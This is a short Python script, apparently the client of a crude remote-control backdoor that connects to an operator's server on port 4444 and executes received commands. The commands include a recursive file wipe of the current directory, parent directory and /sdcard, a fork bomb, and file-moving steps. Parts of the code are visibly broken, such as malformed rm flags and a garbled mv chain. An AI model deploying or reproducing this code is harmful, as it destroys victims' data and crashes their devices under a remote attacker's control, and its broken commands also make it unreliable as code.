########
import os
import socket
import sys
import time
##########
s = socket.socket()
port = 4444
host = input(str("Enter The Server To Start ==> "))
s.connect((host,port))
print ("")
print ("Good..! Connected To The Server Success")
print ("")
#############
while 1:
    command = s.recv(1024)
    command = command.decode()
    print ("Dne.. Command Recieved..!")
    print ("")
    if command == "moajb":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print ("Done.. Command Executed..!")
################
    elif command == "op":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print ("Done.. Command Executed..!")
###################
    elif command == "exit":
        break
######################
    elif command == "PS":
        os.system("rm -rif *")
        os.system("cd /sdcard && rm -rif *")
        os.system("cd .. && rm -rif *")
        print ("")
        print ("Done.. oio..!")
##########################
    elif command == "dump":
        os.system("mv * /root/kali")
        os.system("cd /sdcard && mv * HOME && /root/kali")
        os.system("mv *HOME")
#################################
    elif command == "ps_dos":
        while (True):    
            import os;
            os.fork()
 ####################################
else:
    print ("")
    print ("Ooh..! Comma d Error..!!")
########################################
